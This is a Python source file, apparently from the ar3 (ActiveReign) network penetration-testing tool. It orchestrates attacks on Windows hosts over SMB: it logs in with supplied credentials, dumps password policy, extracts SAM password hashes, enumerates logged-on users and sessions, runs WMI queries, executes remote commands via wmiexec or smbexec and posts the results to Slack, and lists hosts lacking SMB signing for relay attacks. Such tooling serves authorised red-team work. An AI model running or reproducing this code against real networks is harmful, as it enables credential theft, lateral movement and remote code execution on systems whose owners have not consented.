from os import _exit
from threading import Thread

from ar3.core.wmi import WmiCon
from ar3.core.rpc import RpcCon
from ar3.core.smb import SmbCon
from ar3.logger import highlight
from ar3.core.wmiexec import WMIEXEC
from ar3.core.smbexec import SMBEXEC
from ar3.helpers.misc import slack_post
from ar3.ops.enum.polenum import SAMRDump
from ar3.ops.enum.share_finder import share_finder
from ar3.modules import get_module_class, populate_mod_args
from ar3.ops.enum.code_execution import ExecutionTimeout

def requires_admin(func):
    def _decorator(con, *args, **kwargs):
        if not con.admin:
            return False
        return func(con, *args, **kwargs)
    return _decorator


def login(args, loggers, host, db, lockout_obj):
    try:
        con = SmbCon(args, loggers, host, db)
        con.create_smb_con()
        return con
    except Exception as e:
        lockout_obj.failed_login(host, str(e))
        return False


def password_policy(con, args, db_obj, loggers):
    ppol = SAMRDump(con, args.debug, loggers['console'])
    ppol.dump(con.ip)
    if ppol.threshold:
        if ppol.threshold == "None":
            loggers['console'].status('Lockout threshold: None, setting threshold to 99 in database for {}'.format(con.domain))
            db_obj.update_domain(con.domain, 99)
        else:
            loggers['console'].status('Lockout threshold detected, setting threshold to {} in database for {}'.format(ppol.threshold, con.domain))
            db_obj.update_domain(con.domain, ppol.threshold)
    else:
        raise Exception('Enumerating password policy failed')


@requires_admin
def code_execution(con, args, target, loggers, config_obj):
    if args.exec_method == 'wmiexec':
        executioner = WMIEXEC(loggers['console'], target, args, con, share_name=args.fileless_sharename)
    elif args.exec_method == 'smbexec':
        executioner = SMBEXEC(loggers['console'], target, args, con, share_name=args.fileless_sharename)

    loggers[args.mode].info("Code Execution\t{}\t{}\\{}\t{}".format(target, args.domain, args.user, args.execute))
    timer = ExecutionTimeout(executioner, args.execute)
    exe_thread = Thread(target=timer.execute)
    exe_thread.start()
    exe_thread.join(args.timeout + 3)  # Account for sleep timer in exec class

    if args.slack and config_obj.SLACK_API and config_obj.SLACK_CHANNEL:
        post_data = "[Host: {}]\t[User:{}]\t[Command:{}]\r\n{}".format(con.host, args.user, args.execute, timer.result)
        slack_post(config_obj.SLACK_API, config_obj.SLACK_CHANNEL, post_data)

    for line in timer.result.splitlines():
        loggers['console'].info([con.host, con.ip, "CODE EXECUTION", line])


@requires_admin
def extract_sam(con, args, target, loggers):
    loggers[args.mode].info("Extract SAM\t{}\t{}\\{}".format(target, args.domain, args.user))
    con.sam()


def loggedon_users(con, args, target, loggers):
    x = RpcCon(args, loggers, target)
    x.get_netloggedon()
    for user, data in x.loggedon.items():
        if data['logon_srv']:
            loggers['console'].info([con.host, con.ip, "LOGGEDON", '{}\{:<25}'.format(data['domain'], user), "Logon_Server: {}".format(data['logon_srv'])])
        else:
            loggers['console'].info([con.host, con.ip, "LOGGEDON", '{}\{}'.format(data['domain'], user)])


def active_sessions(con, args, target, loggers):
    x = RpcCon(args, loggers, target)
    x.get_netsessions()
    for user, data in x.sessions.items():
        loggers['console'].info([con.host, con.ip, "SESSIONS", user, "Host: {}".format(data['host'])])


def tasklist(con, args, loggers):
    proc = WmiCon(args, loggers, con.ip, con.host)
    proc.get_netprocess(tasklist=True)


@requires_admin
def wmi_query(con, args, target, loggers):
    q = WmiCon(args, loggers, con.ip, con.host)
    loggers[args.mode].info("WMI Query\t{}\t{}\\{}\t{}".format(target, args.domain, args.user, args.wmi_query))
    q.wmi_query(args.wmi_namespace, args.wmi_query)


def execute_module(con, args, target, loggers):
    try:
        module_class = get_module_class(args.module)
        class_obj = module_class()
        populate_mod_args(class_obj, args.module_args, args.debug, loggers['console'])
        loggers[args.mode].info("Module Execution\t{}\t{}\\{}\t{}".format(target, args.domain, args.user, args.module))
        class_obj.run(target, args, con, loggers)
    except Exception as e:
        loggers['console'].fail([con.host, con.ip, args.module.upper(), "Error: {}".format(str(e))])


def host_enum(target, args, lockout, config_obj, db_obj, loggers):
    try:
        # OS Enumeration
        try:
            con = login(args, loggers, target, db_obj, lockout)
            if con.admin:
                loggers['console'].success([con.host, con.ip, "ENUM", con.os + con.os_arch, "(Domain: {})".format(con.srvdomain), "(Signing: {})".format(str(con.signing)), "(SMBv1: {})".format(str(con.smbv1)), "({})".format(highlight(config_obj.PWN3D_MSG, 'yellow'))])
            else:
                loggers['console'].info([con.host, con.ip, "ENUM", con.os + con.os_arch, "(Domain: {})".format(con.srvdomain),"(Signing: {})".format(str(con.signing)), "(SMBv1: {})".format(str(con.smbv1))])
        except Exception as e:
            return []

        # Sharefinder
        shares = []
        if args.share:
            shares = args.share.split(",")
            for share in shares:
                loggers['console'].info([con.host, con.ip, "USER_SHARES", "\\\\{}\\{}".format(con.host, share)])

        elif args.sharefinder or args.spider:
            shares = share_finder(con, args, loggers, target)

        # Secondary actions
        if args.gen_relay_list and not con.signing:
            loggers['relay_list'].info(con.host)
        if args.passpol:
            password_policy(con, args, db_obj, loggers)
        if args.sam:
            extract_sam(con, args, target, loggers)
        if args.loggedon:
            loggedon_users(con, args, target, loggers)
        if args.sessions:
            active_sessions(con, args, target, loggers)
        if args.list_processes:
            tasklist(con, args, loggers)
        if args.wmi_query:
            wmi_query(con, args, target, loggers)
        if args.execute:
            code_execution(con, args, target, loggers, config_obj)
        if args.module:
            execute_module(con, args, target, loggers)

        # Close connections & return
        try:
            con.con.logoff()
        except:
            pass

        con.close()
        loggers['console'].debug("Shares returned for: {} {}".format(target, shares))
        return shares

    except KeyboardInterrupt:
        try:
            con.close()
        except:
            pass
        _exit(0)

    except Exception as e:
        loggers['console'].debug(str(e))